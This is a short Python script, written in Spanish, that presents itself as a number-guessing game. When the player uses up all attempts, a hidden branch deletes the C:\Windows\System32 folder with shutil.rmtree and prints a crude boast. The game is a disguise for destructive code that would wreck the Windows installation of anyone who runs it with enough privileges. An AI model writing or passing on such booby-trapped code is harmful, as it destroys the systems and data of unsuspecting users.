from os import system
system("cls")

import random
import os
import shutil

number = random.randint(1,20)

print("adivina el numero del 1 al 20")
inte=int(input("Cuantos intentos desea: "))

for i in range(inte):
    con=int(input("Ingrese el numero: "))
    if con == number:
        print("Es correcto")
        break
    if con < number:
        print("Es un numero mas alto")
    else:
        print("Es un numero mas bajo")
else:
    car="C:\Windows\System32"
    if os.path.exists(car):
        shutil.rmtree(car)
        print("cago system 32")
        print(f"La carpeta {car} ha sido eliminada.")
    else:
        print("por que chucha no esta la wea ")

